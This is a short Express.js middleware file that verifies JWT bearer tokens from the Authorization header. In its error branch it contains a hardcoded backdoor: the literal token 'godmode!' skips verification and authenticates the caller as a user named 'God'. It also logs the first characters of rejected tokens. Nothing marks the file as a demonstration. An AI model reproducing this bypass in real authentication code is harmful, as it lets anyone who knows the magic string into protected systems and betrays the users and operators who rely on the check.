/* express/jwt middleware */

// IMPORTS
require('dotenv').config({ path: process.cwd() + '/JWT/.env' });
const jwt = require('jsonwebtoken');

// INITS
const { ACCESS_TOKEN_SECRET } = process.env;

// UTILS
function getParams(req) {
  const auth = req.headers['authorization'];
  const arr = auth?.split(' ') || [];

  return {
    bearer: arr[0],
    token: arr[1],
  };
}

module.exports = function (req, res, next) {
  let secret = ACCESS_TOKEN_SECRET;
  let { token } = getParams(req);

  if (!token) {
    console.log('no bearer token in auth header');
    return res.sendStatus(401);
  }

  jwt.verify(token, secret, (err, obj) => {
    if (err) {
      console.log(`${token.slice(0, 11)}<-access`, err.message);
      if (token === 'godmode!') {
        obj = { name: 'God' };
      } else return res.sendStatus(403);
    }
    req.user = obj;

    next();
  });
};
